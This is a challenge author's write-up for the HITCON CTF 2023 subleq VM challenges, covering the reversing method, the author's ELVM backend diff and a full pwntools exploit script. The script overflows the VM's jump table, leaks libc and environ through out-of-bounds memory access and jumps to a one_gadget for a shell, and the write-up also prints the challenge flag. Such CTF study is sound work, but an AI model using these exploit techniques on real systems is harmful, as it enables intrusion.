---
title: HITCON CTF 2023 - LessEQualmore / SUBformore
---

# HITCON CTF 2023 - LessEQualmore / SUBformore
## Challenge Description
This is a two challenge series I created for HITCON CTF 2023. It's a subleq interpreter and program that need to be reversed and exploited. 

<!--more-->

## Challenge detail
```
LessEQualmore(REV):
Sometime, less (instruction) equal more (instruction) ...

SUBformore(PWN):
Apparently, less instruction doesn't mean more security. Who would have guessed?

nc chal-lessequalmore.chal.hitconctf.com 11111

author: bronson113
solves: 33(REV)/ 13(PWN)
```

## Recon
Firstly, we are given two files, the binary file that runs the vm, and a txt file containing the bytecode. The binary file is not stripped, so it's pretty easy to identify the instruction flow: It takes three value in the memory, subtracts the first from the second, and jump to the thrid value if the result is less than zero. Otherwise, the next three bytes are taken as input. This is a simple `subleq` interpreter, and there are a lot of information related to this. Notedly, this is a one instruction set computer (OISC) system.

So the program bytecode is basically subleq instructions, so at this point, one can use any interpreter they want, just need to supply the chal.txt file as the program and it should worked the same.

Digging a bit into the byte code file, you might notice a lot of value near $2^{24}$, this can be an indicator to how the bytecode is generate - through [elvm](https://github.com/shinh/elvm). Notice that in the readme file, subleq is indeed listed as one of the backends supported. 
## Solution - Reversing
For the reversing part of this challenge, the intended solution is to lift the subleq code into elvm ir (or any other ir you desire), extract the matrixs, find the inverse, and decode the value from the matrix inverse.

I'll based this writeup on the fact that you know elvm, though some other recon step can lead you to the same conclusion (albeit in much longer time).
### Disassembling
However, Disassembling the bytecode itself is already quite difficult. Due to the way that the backend generates the subleq code, some constants used in the program are mixed with the instructions, so it's not a simple decode every three bytes sequence, but you need to follow some unconditional jumps to get there. A simple heuristic is that you can notice that if an instruction starts with 0 0 x, it's most likely jumping to x directly if x is somewhere after the current ip. Applying this, you can get a rough subleq instruction grouping. 
### Lifting the instructions
With the subleq instructions, pattern matching is possible using either python 3.10's new matching syntax, or other languages with matching capabilities like rust. You can implement each cases shown in the backend code to get back the elvm ir.

At this point it might be clear that some memory locations are often referenced, so they are likely used as a constant or as a register. This can be verified with the elvm backend source and elvm structure.

However, we are not done yet, if you look at the ir, there are still a lot of repeating structures. As some people mentioned the push and pop macro are extremely long, as those are macro on the ir level. At this point, you should get something like [chal.eir](https://github.com/bronson113/My_CTF_Challenges/blob/main/HITCON%20CTF%202023/LessEQualmore/chal.eir). 

### Matrix multiplication
The last part is to identify that the program is doing matrix multiplication on the input, but the matrix is dispersed across the instructions. thankfully each value in the matrix is at most plus or minus 3, so having 6 different match cases should be doable. Notice that the location where the matrix is zero is just obmitted, so some processing is also needed to fill in that blank.

Anyway, after those steps, two matrixes can be extracted, and multiplying the reference vector with the inverse matrix give us the flag.

### Unintended solution
One other solution to this challenge (and probably how most people solved this) is to extract the transformation matrix by observing the output values. You can change one character by one to see how the result changes, and get the matrix that's equivilant to the two matrix in the program multiplied together. 
## Solution - Pwn
### VM structure
First we need to understand how the subleq vm works. If you reference the elvm backend, you can notice that it's structed as follow:

| :---: | :---: | :---: |
|Init (3)|Register (6)|Constants (7)|
|Memory/Stack (1024)|||
|Jump Table (30) |||
|Code Segment (...) |||

Our input are read in a readline like fasion, and put at the start of the memory section. Naturally, you cover overflow the program and write into the jump table, thereby controlling the program counter within the VM. If you put the shellcode in your input, you can jump to your own input and execute arbitrary subleq code.

### Leaking Addresses and RCE
Since we know that the program memory is malloc with a large chunk, the program will allocate the chunk using mmap, putting it at a fix offset to libc. The vm have an issue that it does check if the memory is out of bound before reading and writing, therefore we can read arbitrary value from the libc.

One path is to leaverage the environment pointer in libc. We can calculate the offset of environ pointer to our chunk, and read the value into a controlled memory location. However, to utilize the value, we need a method to deference the pointer. Since each subleq value is 8 byte, we need to divide the value we get by 8 before using that as the index to the stack. It actually took me longer to divide the value than all the other steps combined.  The other path is to overwrite the stdout structure to leak value, and use subleq shellcode to read value back. 

After you leak the value, you just overwrite the return pointer and do ROP, and that's your shell!

### Solve script
{% capture solve_py %}
```
#!/usr/bin/python3
from pwn import *

elf = ELF("./lessequalmore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

#p = process(["./lessequalmore_patched", "../dist/chal.txt"])
p = remote("34.81.247.217", 11111)


def send_int(n):
    if n >= 0:
        p.sendline(f"%{n}")
    else:
        n+=(1<<64)
        p.sendline(f"%{n}")

def send_ints(ns):
    for i in ns:
        send_int(i)

def send_str(s):
    for i in s:
        send_int(ord(i))

flag = "hitcon{r3vErs1ng_0n3_1ns7ruction_vm_1s_Ann0ying_c9adf98b67af517}"
# 64+1 -> input
# 16+1 -> buf
# 64 -> target
# 20+1 -> prompt
# 12+1 -> prompt2
# 27+1 -> win
# 18+1 -> lose
padding = sum([64+1, 16+1, 64, 20+1, 12+1, 27+1, 18+1])
mem = 1024
print(padding)
#send_str("\x00"*(64+1+16+1+64+20+1))
#send_str("a"*(12+1+27+1+18+1))

cur_ip = 16
def subleq(a, b, target=None):
    global cur_ip
    cur_ip += 3
    if target:
        return [a, b, target]
    else:
        return [a, b, cur_ip]

def to_data(idx):
    return 19+idx

# data:
# stack offset
# r shift amount
# overflow base
# 1
# one_gadget
one_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8][2]

data = [1, libc.symbols['malloc'], 0x148 - (0x84000 - 0x10), 1<<56, 52, -1*one_gadget]
print(data)
shellcode = subleq(0, 0, cur_ip + 3 + len(data))
cur_ip+=len(data)
# data
shellcode+= data
shellcode+= subleq(1, 1)
shellcode+= subleq(to_data(0), 1) # get -1
shellcode+= subleq(2, 2)
shellcode+= subleq(3, 3)
shellcode+= subleq(4, 4)
libc_malloc = libc.got['malloc'] + 0x84000 - 0x10 # libc_offset + mmap size - heap chunk header
shellcode+= subleq(libc_malloc//8, 2)
shellcode+= subleq(2, 3)
shellcode+= subleq(to_data(1), 3) # libc base
libc_environ = libc.symbols['environ'] + 0x84000 - 0x10 # libc_offset + mmap size - heap chunk header
shellcode+= subleq(2, 2)
shellcode+= subleq(libc_environ//8, 2)
shellcode+= subleq(2, 4)
shellcode+= subleq(3, 4) # subtract libc_base
shellcode+= subleq(to_data(2), 4) # subtract offset from libc_base & from environ
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 5)
shellcode+= subleq(4, 2)
shellcode+= subleq(2, 5)
shellcode+= subleq(7, 7) # counter
shellcode+= subleq(2, 2)
# divide by 8
#
div_label = cur_ip
shellcode+= subleq(2, 2)
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 2)
shellcode+= subleq(5, 2) # [3]->-2n
shellcode+= subleq(5, 5)
shellcode+= subleq(2, 5) # [5]->2n

shellcode+= subleq(6, 6)
shellcode+= subleq(2, 6) # [6]->2n
shellcode+= subleq(to_data(3), 6, cur_ip+12) #[if 1<<56 < [6]] continue
shellcode+= subleq(to_data(3), 5) # [5] -= 1<<56
shellcode+= subleq(1, 5)          # [5] += 1
shellcode+= subleq(0, 0)
shellcode+= subleq(0, 0)
shellcode+= subleq(0, 0)
shellcode+= subleq(1, 7) # counter += 1

shellcode+= subleq(8, 8)
shellcode+= subleq(2, 2)
shellcode+= subleq(7, 2)
shellcode+= subleq(2, 8) # [8] = counter
shellcode+= subleq(to_data(4), 8, div_label)
# now [5] points to return address
shellcode+= subleq(2, 2)
shellcode+= subleq(0, 0)
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 2)
shellcode+= subleq(2, cur_ip+6)
shellcode+= subleq(2, cur_ip+4)
shellcode+= subleq(0, 0)
shellcode+= subleq(to_data(5), 3)
shellcode+= subleq(3, 11)
shellcode+= subleq(2, cur_ip+4)
shellcode+= subleq(11, 0)
shellcode+= subleq(0, 0, -2)

send_ints(shellcode)

send_str("\x00" * (mem - len(shellcode)))

gdb_script = """
handle SIGSEGV stop nopass
c
set $rax=$rbx
b *op1
b *run_program+165
"""

#gdb.attach(p, gdb_script)

jmp_table = [1070,1134,1362,1558,1754,1950,2211,2456,2717,2962,3094,3110,3389,3521,3717,3720,3916,3919,4198,4333,4503,4906,5185,5325,5429,5754,25688,42696,43215,43715]
print(len(jmp_table))
jmp_table = [16] * len(jmp_table)
send_ints(jmp_table)
p.interactive()
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="solve_py" button-text="Show exp.py" toggle-text=solve_py %}
## How the challenge is built
### ELVM
The challenge is mostly build on top of ELVM with a small modification to the subleq backed. The default configuration would generate $2^{24}$ 0s as the memory and that would be a huge file to reverse. I changed the backend a little bit so that the output is shorter and there are no comments. The diff is as follow.

{% capture diff_backend %}
```diff
diff --git a/target/subleq.c b/target/subleq.c
index a5c1341..ee1596d 100644
--- a/target/subleq.c
+++ b/target/subleq.c
@@ -13,6 +13,8 @@
 #define SUBLEQ_NEG_UINTMAX_CONST (15)
 #define SUBLEQ_REG(regnum) (regnum + 3)
 #define SUBLEQ_MEM(index) (index + 16)
+#define VM_MEMORY_LIMIT (1<<10)
+#define VM_SP_INIT (VM_MEMORY_LIMIT - 1)
 static const int32_t SUBLEQ_OPS_TABLE[7][3] = {
   {1, 0, 0}, // EQ, JEQ
   {0, 1, 1}, // NE, JNE
@@ -150,17 +152,19 @@ static void init_state_subleq(Data* data) {
   subleq.word_on = 0;

   // Data length always includes 7 registers and 6 constants
-  size_t data_length = 13 + (1 << 24) - 1 + subleq.pc_cnt;
+  size_t data_length = 13 + VM_MEMORY_LIMIT - 1 + subleq.pc_cnt;

   subleq_emit_instr(0, 0, data_length + 4);
   // Emit registers
-  emit_line("0 0 0 0 0 0 0");
+  // Init SP to -1 in the VM memory so we can adjust memory size
+  // instead of relying on underflow
+  emit_line("0 0 0 0 0 %d 0", VM_SP_INIT);
   // Emit constants
   emit_line("-1 1 %d %d %d -%d",
               SUBLEQ_MEM(0), subleq.jump_table_start,
               UINT_MAX + 1, UINT_MAX + 1);

-  for (int mp = 0; mp < (1 << 24); mp++) {
+  for (int mp = 0; mp < VM_MEMORY_LIMIT; mp++) {

     if (mp != 0 && mp % SUBLEQ_MAX_WORDS_LINE == 0){
       emit_line("");
@@ -171,10 +175,10 @@ static void init_state_subleq(Data* data) {
       data = data->next;

       if (!data){
-        emit_line("\n#{loc_skip:%d}", (1 << 24) - mp - 1);
+        //emit_line("\n#{loc_skip:%d}", VM_MEMORY_LIMIT - mp - 1);
       }

-    } else if (((1 << 24) - mp) % SUBLEQ_MAX_WORDS_LINE != 0){
+    } else if ((VM_MEMORY_LIMIT - mp) % SUBLEQ_MAX_WORDS_LINE != 0){
       emit_str("0 ");
     } else {
       emit_str("\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0");
@@ -198,7 +202,7 @@ static void subleq_emit_inst(Inst* inst) {
   switch (inst->op) {
   case MOV:
     {
-      emit_line("# Doing move");
+      //emit_line("# Doing move");
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);
       subleq_emit_zero(SUBLEQ_REG(inst->dst.reg));
@@ -207,18 +211,18 @@ static void subleq_emit_inst(Inst* inst) {
     break;

   case ADD:
-    {
-      emit_line("# Doing add");
+       {
+      //emit_line("# Doing add");
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);
-      subleq_emit_add(src_loc, SUBLEQ_REG(inst->dst.reg));
-      subleq_emit_wrap_umaxint(SUBLEQ_REG(inst->dst.reg));
-    }
-    break;
+                 subleq_emit_add(src_loc, SUBLEQ_REG(inst->dst.reg));
+                 subleq_emit_wrap_umaxint(SUBLEQ_REG(inst->dst.reg));
+         }
+         break;

   case SUB:
     {
-      emit_line("# Doing sub");
+      //emit_line("# Doing sub");
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);
       subleq_emit_sub(src_loc, SUBLEQ_REG(inst->dst.reg));
@@ -228,11 +232,11 @@ static void subleq_emit_inst(Inst* inst) {

   case LOAD:
     if (inst->src.type == IMM){
-      emit_line("# Doing load imm");
+      //emit_line("# Doing load imm");
       subleq_emit_zero(SUBLEQ_REG(inst->dst.reg));
       subleq_emit_add(SUBLEQ_MEM(inst->src.imm), SUBLEQ_REG(inst->dst.reg));
     } else if (inst->src.type == REG){
-      emit_line("# Doing load reg");
+      //emit_line("# Doing load reg");
       subleq_emit_add(SUBLEQ_REG(inst->src.reg), 1);
       subleq_emit_add(SUBLEQ_MEM_START_CONST, 1);
       subleq_emit_load_dblptr(1, SUBLEQ_REG(inst->dst.reg));
@@ -242,11 +246,11 @@ static void subleq_emit_inst(Inst* inst) {

   case STORE:
     if (inst->src.type == IMM){
-      emit_line("# Doing store imm");
+      //emit_line("# Doing store imm");
       subleq_emit_zero(SUBLEQ_MEM(inst->src.imm));
       subleq_emit_add(SUBLEQ_REG(inst->dst.reg), SUBLEQ_MEM(inst->src.imm));
     } else if (inst->src.type == REG){
-      emit_line("# Doing store reg dest: %s src: %s", reg_names[inst->src.reg], reg_names[inst->dst.reg]);
+      //emit_line("# Doing store reg dest: %s src: %s", reg_names[inst->src.reg], reg_names[inst->dst.reg]);
       subleq_emit_add(SUBLEQ_REG(inst->src.reg), 1);
       subleq_emit_add(SUBLEQ_MEM_START_CONST, 1);
       subleq_emit_store_dblptr(SUBLEQ_REG(inst->dst.reg), 1);
@@ -256,7 +260,7 @@ static void subleq_emit_inst(Inst* inst) {

   case PUTC:
     {
-      emit_line("# Putting char");
+      //emit_line("# Putting char");
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);
       subleq_emit_instr(src_loc, -1, subleq.word_on + 3);
@@ -264,7 +268,7 @@ static void subleq_emit_inst(Inst* inst) {
     break;

   case GETC:
-    emit_line("# Getting char");
+    //emit_line("# Getting char");
     subleq_emit_instr(-1, SUBLEQ_REG(inst->dst.reg), subleq.word_on + 3);
     subleq_emit_cmp(SUBLEQ_REG(inst->dst.reg), SUBLEQ_NEG_ONE_CONST, 6, 3, 3);
     subleq_emit_sub(SUBLEQ_ONE_CONST, SUBLEQ_REG(inst->dst.reg));
@@ -272,7 +276,7 @@ static void subleq_emit_inst(Inst* inst) {
     break;

   case EXIT:
-    // emit_line("# Exiting");
+    //emit_line("# Exiting");
     subleq_emit_instr(0, 0, -1);
     break;

@@ -286,7 +290,7 @@ static void subleq_emit_inst(Inst* inst) {
   case LE:
   case GE:
     {
-      emit_line("# Doing comparison");
+      //emit_line("# Doing comparison");
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);

@@ -312,7 +316,7 @@ static void subleq_emit_inst(Inst* inst) {
   case JLE:
   case JGE:
     {
-      emit_line("# Doing cond jump to pc %d", inst->jmp.type == REG ? -1 : inst->jmp.imm);
+      //emit_line("# Doing cond jump to pc %d", inst->jmp.type == REG ? -1 : inst->jmp.imm);
       int32_t src_loc = (inst->src.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->src.reg) : subleq_emit_imm(inst->src.imm);
       int32_t jmp_loc = (inst->jmp.type == REG) ? (int32_t)SUBLEQ_REG(
@@ -336,7 +340,7 @@ static void subleq_emit_inst(Inst* inst) {

   case JMP:
     {
-      emit_line("# Doing jump");
+      //emit_line("# Doing jump");
       int32_t jmp_loc = (inst->jmp.type == REG) ? (int32_t)SUBLEQ_REG(
         inst->jmp.reg) : subleq_emit_imm(inst->jmp.imm);

@@ -387,7 +391,7 @@ void target_subleq(Module* module) {
   prev_pc = -1;
   for (Inst* inst = module->text; inst; inst = inst->next) {
     if (prev_pc != inst->pc) {
-      emit_line("\n# PC = %d", inst->pc);
+      //emit_line("\n# PC = %d", inst->pc);
     }
     prev_pc = inst->pc;
     emit_line("");
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="diff_backend" button-text="Show diff" toggle-text=diff_backend %}
### IR Generation
I first tried to use the C frontend that was provided by elvm, but then realized that it generated way too much code (Seems like it doesn't perform dead code elimination in it's pipeline), making the output file too large to reasonably reverse. Therefore, I end up writing a python script to generate the IR for me. I created some macros for defining labels, functions, and basic push/pop instructions as they aren't defined in elvm IR. It's pretty interesting for me to come up with the calling conventions and other stuff. The generator code can be found [here](https://github.com/bronson113/My_CTF_Challenges/blob/main/HITCON%20CTF%202023/LessEQualmore/gen.py)

## Potential Improvements
This is the section mostly to conclude what goes wrong and what this challenge can potentially be so I don't make the same mistakes again (Though I probably will anyway lol). I hope this can also provide insight to other people when creating challenges. 

### Linear relationship
As mentioned in the unintended solution section, one way to solve the reserving part of the challenge is to observe the linear relationship between the input and output. This should be kept in mind when desiging a flag checker type program. Often there are some ways to observe the program's input/output state and extract information related to the process. Adding some sort of SBOX in this case should be sufficient in preventing the unintended solution. 

### Exploring potential for the VM
I think I didn't put enough time into exploring the VM structure. Mentioned by @theKidOfArcrania on discord, this challenge can totally leaverage the calling convention and require the player to perform something similar to a ROP within the VM as well, instead of having the ability to modify code itself, as some people used in their solution. Having a stack overflow that end up overwriting the register section and pointing the SP to a controlled area would have been a fun idea to explore, and add some complexity to the pwn aspect of this challenge.

## Conclusion
I guess I've already speaked too much in this article. Anyway I hoped that everyone that attempted this challenge have fun, and learned something about reversing / pwning a single instruction vm :)
